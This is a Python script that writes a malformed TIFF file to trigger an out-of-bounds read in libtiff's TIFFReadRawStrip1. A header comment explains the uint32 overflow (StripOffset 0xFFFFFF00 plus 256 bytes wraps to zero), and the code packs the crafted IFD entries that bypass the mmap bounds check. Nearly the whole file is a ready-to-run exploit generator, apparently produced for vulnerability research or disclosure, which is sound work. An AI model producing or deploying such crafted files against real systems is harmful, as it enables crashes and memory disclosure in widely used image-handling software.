#!/usr/bin/env python3
"""
VULN 001 PoC Generator
======================
Vulnerability: TIFFReadRawStrip1 mmap bounds-check uint32 overflow -> OOB read
Location:      libtiff/libtiff/tif_read.c, lines 197-209
CWE:           CWE-125 (Out-of-bounds Read)

Trigger mechanism:
  In TIFFReadRawStrip1() (mmap branch), the bounds check is:
      if (td->td_stripoffset[strip] + size > tif->tif_size)
  Both td_stripoffset and tif_size are uint32. With:
      StripOffset    = 0xFFFFFF00
      StripByteCount = 256  (0x100)
  The addition: 0xFFFFFF00 + 0x100 = 0x100000000  ->  overflows uint32 to 0x00000000
  Check becomes: 0 > <file_size>  ->  FALSE  -> bounds check bypassed!
  Then: _TIFFmemcpy(buf, tif_base + 0xFFFFFF00, 256) reads far beyond mapped region.

Call path triggered by tiffsplit:
  main() -> TIFFOpen() -> tiffcp() -> cpStrips() -> TIFFReadRawStrip()
          -> TIFFReadRawStrip1() (mmap branch)
"""

import struct
import sys

# IFD entry type codes
SHORT    = 3
LONG     = 4
RATIONAL = 5


def ifd_entry(tag, typ, count, value):
    """Pack one 12-byte IFD entry (little-endian TIFF)."""
    return struct.pack('<HHII', tag, typ, count, value)


def create_vuln_tiff(output_path):
    # ---- layout constants ----
    ifd_offset   = 8       # IFD immediately follows the 8-byte header
    num_entries  = 11
    # IFD block size: 2 (entry count) + 11*12 (entries) + 4 (next-IFD ptr) = 138 bytes
    ifd_end      = ifd_offset + 2 + num_entries * 12 + 4   # = 146
    xres_offset  = ifd_end          # XResolution rational at byte 146
    yres_offset  = xres_offset + 8  # YResolution rational at byte 154
    # total file: 162 bytes

    # ---- crafted values ----
    STRIP_OFFSET     = 0xFFFFFF00   # near UINT32_MAX
    STRIP_BYTECOUNT  = 256          # small positive; sum overflows to 0

    # ---- IFD entries (must be sorted ascending by tag) ----
    entries = [
        ifd_entry(0x0100, SHORT,    1, 4),               # ImageWidth = 4
        ifd_entry(0x0101, SHORT,    1, 4),               # ImageLength = 4
        ifd_entry(0x0102, SHORT,    1, 8),               # BitsPerSample = 8
        ifd_entry(0x0103, SHORT,    1, 1),               # Compression = 1 (none)
        ifd_entry(0x0106, SHORT,    1, 1),               # PhotometricInterp = 1 (BlackIsZero)
        ifd_entry(0x0111, LONG,     1, STRIP_OFFSET),    # StripOffsets = 0xFFFFFF00 [CRAFTED]
        ifd_entry(0x0115, SHORT,    1, 1),               # SamplesPerPixel = 1
        ifd_entry(0x0116, SHORT,    1, 4),               # RowsPerStrip = 4
        ifd_entry(0x0117, LONG,     1, STRIP_BYTECOUNT), # StripByteCounts = 256 [CRAFTED]
        ifd_entry(0x011A, RATIONAL, 1, xres_offset),    # XResolution -> offset 146
        ifd_entry(0x011B, RATIONAL, 1, yres_offset),    # YResolution -> offset 154
    ]

    # ---- build file ----
    header    = struct.pack('<HHI', 0x4949, 42, ifd_offset)  # II + magic 42 + IFD offset
    ifd_block = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)
    xres_data = struct.pack('<II', 72, 1)   # 72/1 dpi
    yres_data = struct.pack('<II', 72, 1)

    tiff_bytes = header + ifd_block + xres_data + yres_data

    with open(output_path, 'wb') as f:
        f.write(tiff_bytes)

    file_size    = len(tiff_bytes)
    overflow_sum = (STRIP_OFFSET + STRIP_BYTECOUNT) & 0xFFFFFFFF

    print(f"[+] Created: {output_path}  ({file_size} bytes)")
    print(f"[+] StripOffsets[0]    = 0x{STRIP_OFFSET:08X}  ({STRIP_OFFSET})")
    print(f"[+] StripByteCounts[0] = {STRIP_BYTECOUNT}")
    print(f"[+] uint32 overflow:   0x{STRIP_OFFSET:08X} + {STRIP_BYTECOUNT}"
          f" = 0x{overflow_sum:08X}  (wraps to {overflow_sum})")
    print(f"[+] Bounds check:      '{overflow_sum} > {file_size}' = False  => bypassed!")
    print(f"[+] OOB memcpy from:   tif_base + 0x{STRIP_OFFSET:08X}"
          f"  (mmap'd region is only {file_size} bytes)")


if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'vuln_001.tif'
    create_vuln_tiff(out)
